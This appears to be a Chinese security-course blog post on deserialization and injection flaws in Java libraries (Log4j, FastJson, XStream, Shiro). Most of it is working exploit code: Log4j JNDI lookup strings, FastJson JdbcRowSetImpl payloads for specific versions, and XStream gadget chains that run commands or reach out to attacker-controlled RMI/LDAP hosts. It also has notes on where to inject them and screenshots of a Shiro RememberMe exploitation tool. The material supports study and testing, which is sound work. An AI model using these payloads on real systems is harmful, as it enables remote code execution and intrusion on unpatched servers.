---
title: JavaEE应用&依赖项&Log4j日志&Shiro验证&FastJson数据&XStream格式
published: 2026-03-16 20:00:00
description: 关于JavaEE应用中第三方依赖库安全风险的深度解析，涵盖了Log4j日志、FastJson数据、XStream格式、Shiro验证等组件的漏洞原理、利用方式和演示。
tags: [Web开发,JavaEE]
category: 网络安全
draft: false
---

# 知识点

1. 安全开发-JavaEE-第三方依赖开发安全
2. 安全开发-JavaEE-数据转换&FastJson&XStream
3. 安全开发-JavaEE-Shiro身份验证&Log4j日志处理

# Log4j

详细搜log4j CVE

一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。

1、Maven引用

2、接受输入值

3、Log4j错误处理

4、Jndi注入RCE执行

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
```

```java
String code="${java:os}";
logger.error("{}",code);

String exp="${jndi:ldap://xx.xx.xx.xx:xx/xxx}";
logger.error("{}",exp);
```

演示：2.14.1版本

## 代码部分

需要观察是否引用log4j，且代码中出现了调用log函数

```java
package com.example.log4jdemo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {
    private static final Logger log = LogManager.getLogger(Log4jTest.class);

    public static void main(String[] args) {

        String code = "${jndi:ldap://192.168.0.12:1389/idjava}";
        log.error("{}",code);
    }
}
```

![image-20260316163749859](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260316163749859.png)

结论：尝试输出日志时可利用JNDI注入触发RCE

利用：黑盒在各种地方插入（输入框或者参数）、白盒看库版本和反序列方法和对应可控变量哪里有调用

参考：https://mp.weixin.qq.com/s/95Jxj3R9q95CFhCn86IiYA

# FastJson

详细搜fastjson CVE

一个阿里巴巴开发的Java库，提供了Java对象与JSON相互转换。

```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
</dependency>
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.25</version>
</dependency>
```

## 序列化方法

```
JSON.toJSONString()，返回字符串；

JSON.toJSONBytes()，返回byte数组；
```

## 反序列化方法

```
JSON.parseObject()，返回JsonObject；

JSON.parse()，返回Object；

JSON.parseArray(), 返回JSONArray；

将JSON对象转换为java对象：JSON.toJavaObject()；

将JSON对象写入write流：JSON.writeJSONString()；
```

## 常用

```
JSON.toJSONString()
JSON.parse()
JSON.parseObject()
```

演示：1.2.24及1.2.25版本

## 代码部分

其实就是修改引用依赖的版本号，

因为版本修复，所以1.2.25及以上版本的payload与1.2.24的不同，导致失效，所以根据版本来构造payload

```java
import com.alibaba.fastjson.JSON;

public class FastJsonSer {
    public static void main(String[] args) {
        // 设置信任远程服务器加载的对象
        System.setProperty("java.util.Arrays.useLegacyMergeSort", "true");

		// 1.2.24版本
        // 设置payload
        String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://xx.xx.xx.xx/xxxx\", " +
                "\"autoCommit\":true" +
                "}";
                
         // 1.2.25-1.2.47
        String payload = "{\n" +
                "    \"a\": {\n" +
                "        \"@type\": \"java.lang.Class\",\n" +
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\": {\n" +
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\": \"rmi://vps_ip:9999/badClassName\",\n" +
                "        \"autoCommit\": true\n" +
                "    }\n" +
                "}";       
                        
        JSON.parse(payload);
    }
}

```

结论：反序列化时会调用类里的get及set方法

利用：已知类的调用方法 自带类的调用链固定版本的CVE

黑盒看传递JSON数据尝试替换、白盒看调用方法和可控变量

参考：https://mp.weixin.qq.com/s/EPdNElXPcZd5wEmQqAhFiQ

# XStream

详细搜索XStream反序列化 CVE

一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和XML文档相互转换)。

```xml
<dependency>
    <groupId>com.thoughtworks.xstream</groupId>
    <artifactId>xstream</artifactId>
    <version>1.4.5</version>
</dependency>

<dependency>
    <groupId>com.thoughtworks.xstream</groupId>
    <artifactId>xstream</artifactId>
    <version>1.4.15</version>
</dependency>
```

## 序列化Car类

```
Car car = new Car("Ferrari", 4000000);
XStream xStream = new XStream();
String xml = xStream.toXML(car);
System.out.print(xml);
```

## 反序列化Car类

```
String xml = "上述序列化类的数据";
XStream xStream = new XStream();
xStream.fromXML(xml);
```

## 代码部分

Car类

需要继承Serializable

```java
package com.example.xstreamdemo;

import java.io.IOException;
import java.io.Serializable;

public class Car implements Serializable {
    private String name;
    private String color;

    public Car(String name, String color) {
        this.name = name;
        this.color = color;
    }
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }
    public String getColor() {
        return color;
    }
    public void setColor(String color) {
        this.color = color;
    }

    private void readObject(java.io.ObjectInputStream stream) throws IOException, ClassNotFoundException {
        stream.defaultReadObject();
        System.out.println("Print Car");
        Runtime.getRuntime().exec("calc");
    }

}
```

序列化部分

```java
package com.example.xstreamdemo;

import com.thoughtworks.xstream.XStream;

public class XstreamDemo {
    public static void main(String[] args) {
        Car ModelY = new Car("ModelY","black");
        XStream xstream = new XStream();

        // 序列化数据 序列化对象ModelY
        String xml = xstream.toXML(ModelY);
        System.out.println(xml);
    }
}
```

反序列化部分

此时就会触发car类中的readObject，弹出计算器

```java
package com.example.xstreamdemo;
import com.thoughtworks.xstream.XStream;

public class XstreamSer {
    public static void main(String[] args) {
        // 反序列化 将xml转为java对象
        XStream xstream = new XStream();
        String payload = "<com.example.xstreamdemo.Car serialization=\"custom\">\n" +
                "  <com.example.xstreamdemo.Car>\n" +
                "    <default>\n" +
                "      <color>black</color>\n" +
                "      <name>ModelY</name>\n" +
                "    </default>\n" +
                "  </com.example.xstreamdemo.Car>\n" +
                "</com.example.xstreamdemo.Car>";
        xstream.fromXML(payload);
    }
}
```

结论：反序列化时会调用类里的readObject方法(类需继承接口)

利用：已知类的调用方法、自带类的调用链固定版本的CVE

黑盒看传递XML数据尝试替换 白盒看调用方法和可控变量

参考：https://mp.weixin.qq.com/s/M_oQyZYQEFu0nbG-IpJt_A

## 已知类的调用方法

```
String xml = "<com.example.xstreamdemo.Car serialization=\"custom\">\n" +
                "  <com.example.xstreamdemo.Car>\n" +
                "    <default>\n" +
                "      <price>4000000</price>\n" +
                "      <name>Ferrari</name>\n" +
                "    </default>\n" +
                "  </com.example.xstreamdemo.Car>\n" +
                "</com.example.xstreamdemo.Car>";
```

## 自带类的调用链固定版本的CVE

```java
String payload = "<sorted-set>\n" +
                "    <dynamic-proxy>\n" +
                "        <interface>java.lang.Comparable</interface>\n" +
                "        <handler class=\"java.beans.EventHandler\">\n" +
                "            <target class=\"java.lang.ProcessBuilder\">\n" +
                "                <command>\n" +
                "                    <string>calc.exe</string>\n" +
                "                </command>\n" +
                "            </target>\n" +
                "            <action>start</action>\n" +
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</sorted-set>";

String poc="<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n" +
                "        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n" +
                "          <packet>\n" +
                "            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n" +
                "              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\n" +
                "                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\n" +
                "                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\n" +
                "                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\n" +
                "                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>\n" +
                "                      <uriProperties/>\n" +
                "                      <attributeProperties/>\n" +
                "                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\n" +
                "                        <getter>\n" +
                "                          <class>com.sun.rowset.JdbcRowSetImpl</class>\n" +
                "                          <name>getDatabaseMetaData</name>\n" +
                "                          <parameter-types/>\n" +
                "                        </getter>\n" +
                "                      </inheritedAttWildcard>\n" +
                "                    </bi>\n" +
                "                    <tagName/>\n" +
                "                    <context>\n" +
                "                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\n" +
                "                        <outer-class reference='../..'/>\n" +
                "                      </marshallerPool>\n" +
                "                      <nameList>\n" +
                "                        <nsUriCannotBeDefaulted>\n" +
                "                          <boolean>true</boolean>\n" +
                "                        </nsUriCannotBeDefaulted>\n" +
                "                        <namespaceURIs>\n" +
                "                          <string>1</string>\n" +
                "                        </namespaceURIs>\n" +
                "                        <localNames>\n" +
                "                          <string>UTF-8</string>\n" +
                "                        </localNames>\n" +
                "                      </nameList>\n" +
                "                    </context>\n" +
                "                  </bridge>\n" +
                "                </bridge>\n" +
                "                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>\n" +
                "                  <javax.sql.rowset.BaseRowSet>\n" +
                "                    <default>\n" +
                "                      <concurrency>1008</concurrency>\n" +
                "                      <escapeProcessing>true</escapeProcessing>\n" +
                "                      <fetchDir>1000</fetchDir>\n" +
                "                      <fetchSize>0</fetchSize>\n" +
                "                      <isolation>2</isolation>\n" +
                "                      <maxFieldSize>0</maxFieldSize>\n" +
                "                      <maxRows>0</maxRows>\n" +
                "                      <queryTimeout>0</queryTimeout>\n" +
                "                      <readOnly>true</readOnly>\n" +
                "                      <rowSetType>1004</rowSetType>\n" +
                "                      <showDeleted>false</showDeleted>\n" +
                "                      <dataSource>rmi://192.168.1.4:1099/rj6obg</dataSource>\n" +
                "                      <params/>\n" +
                "                    </default>\n" +
                "                  </javax.sql.rowset.BaseRowSet>\n" +
                "                  <com.sun.rowset.JdbcRowSetImpl>\n" +
                "                    <default>\n" +
                "                      <iMatchColumns>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                      </iMatchColumns>\n" +
                "                      <strMatchColumns>\n" +
                "                        <string>foo</string>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                      </strMatchColumns>\n" +
                "                    </default>\n" +
                "                  </com.sun.rowset.JdbcRowSetImpl>\n" +
                "                </jaxbObject>\n" +
                "              </dataSource>\n" +
                "            </message>\n" +
                "            <satellites/>\n" +
                "            <invocationProperties/>\n" +
                "          </packet>\n" +
                "        </indexMap>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
```

# Shiro

一个强大且易用的安全框架，可用于身份验证、授权、加密和会话管理等。

```xml
<dependency>
	<groupId>org.apache.shiro</groupId>
	<artifactId>shiro-web</artifactId>
	<version>1.9.1</version>
</dependency>
```

开发技术：SpringBoot，依赖项：FastJson、Shiro

运行该项目访问login方法，url：

```
localhost:8888/login
```

此时页面回显“please login pattern /doLogin”，说明项目正常运行。源代码：

```java
@ResponseBody
    @RequestMapping(value={"/login"})
    public String loginPage() {
        return "please login pattern /doLogin";
    }
```

此时使用shiro检测工具：

<img src="https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260316200005537.png" alt="image-20260316200005537" style="zoom:80%;" />

发现存在cc1链，且命令执行成功

![image-20260316201222741](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260316201222741.png)

![image-20260316201244579](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260316201244579.png)

结论：配置不当或版本安全漏洞

利用：固定版本的CVE利用

![image-20260316201550879](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260316201550879.png)

黑盒看身份验证数据包（RememberMe）、白盒看版本及安全问题

参考：https://mp.weixin.qq.com/s/kmGcrVmaLi0Db_jwKKNXag